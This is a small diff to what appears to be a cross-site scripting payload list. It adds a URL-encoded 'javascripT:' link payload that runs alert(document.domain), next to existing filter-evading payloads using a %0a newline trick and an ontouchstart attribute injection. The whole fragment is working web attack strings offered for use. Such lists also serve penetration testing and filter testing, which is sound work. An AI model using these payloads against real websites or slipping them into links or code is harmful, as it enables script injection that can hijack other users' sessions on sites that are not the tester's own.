@@ -206,6 +206,7 @@ DOM
 
 Change the logo link
   javascripT://https://google.com%0aalert(1);//https://google.com
+  javascripT%3A%2F%2Fhttps%3A%2F%2Fgoogle.com%250aalert(document.domain)%3B%2F%2Fhttps%3A%2F%2Fgoogle.com
 
 Mobile version
   " ontouchstart="alert(1)
